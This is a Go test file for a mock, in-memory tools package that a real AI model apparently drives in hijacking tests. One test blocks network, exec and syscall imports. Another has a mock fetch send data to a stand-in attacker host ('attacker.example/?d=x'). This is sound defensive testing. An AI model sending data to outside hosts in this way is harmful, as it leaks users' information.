package tools

import (
	"go/parser"
	"go/token"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// The tools must stay in-memory: a real model (-agent=bedrock) drives them,
// so a network or mail import here would let a hijacked model leak for real.
func TestToolsImportNoNetwork(t *testing.T) {
	files, _ := filepath.Glob("*.go")
	for _, f := range files {
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		af, err := parser.ParseFile(token.NewFileSet(), f, nil, parser.ImportsOnly)
		if err != nil {
			t.Fatal(err)
		}
		for _, imp := range af.Imports {
			p, _ := strconv.Unquote(imp.Path.Value)
			if p == "net" || strings.HasPrefix(p, "net/") || p == "os/exec" || p == "syscall" {
				t.Errorf("%s imports %s; tools must not reach the network", f, p)
			}
		}
	}
}

func TestToolsOnlyRecord(t *testing.T) {
	w := &Web{}
	out, err := w.Fetch(map[string]string{"url": "https://attacker.example/?d=x"})
	if err != nil || out != "<html>ok</html>" || len(w.Fetched) != 1 {
		t.Fatalf("Fetch = %q, %v, %v", out, err, w.Fetched)
	}
	m := &Mailbox{}
	if _, err := m.SendEmail(map[string]string{"to": "a@b.example", "body": "x"}); err != nil || len(m.Sent) != 1 {
		t.Fatalf("SendEmail did not just record: %v %v", err, m.Sent)
	}
}
